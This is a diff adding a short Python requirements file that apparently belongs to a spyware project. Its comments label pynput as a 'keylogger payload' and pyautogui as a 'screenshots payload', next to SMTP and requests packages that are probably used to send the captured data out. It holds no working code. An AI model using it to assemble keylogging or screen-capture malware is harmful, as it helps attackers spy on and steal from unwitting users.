@@ -1,0 +1,7 @@
+sockets==1.0.0
+secure-smtplib==0.1.1   # email
+python-dotenv==0.19.0   # for .env files
+pyautogui==0.9.53       # screenshots payload
+pynput==1.7.3           # keylogger payload
+requests==2.26.0
+
